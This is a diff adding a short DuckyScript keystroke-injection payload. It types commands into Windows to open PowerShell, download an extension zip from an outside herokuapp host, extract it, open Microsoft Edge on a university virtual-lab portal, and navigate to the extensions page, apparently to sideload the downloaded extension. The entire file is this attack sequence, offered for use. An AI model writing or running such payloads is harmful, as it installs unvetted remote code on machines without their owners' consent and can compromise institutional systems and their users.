@@ -1,0 +1,27 @@
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Download the extension zip
+STRING Invoke-WebRequest "https://ghost-tester-a8265efa9b4b.herokuapp.com/download/extension.zip" -OutFile "$HOME\Downloads\extension.zip"
+ENTER
+
+DELAY 1000
+
+REM Unzip the extension
+STRING Expand-Archive -Path "$HOME\Downloads\extension.zip" -DestinationPath "$HOME\Downloads" -Force
+ENTER
+
+DELAY 200
+
+REM Launch Edge with the extension
+STRING start microsoft-edge:https://vlab.ung.edu/portal/webclient/index.html
+ENTER
+DELAY 500
+CTRL t
+DELAY 500
+STRING edge://extensions
+ENTER
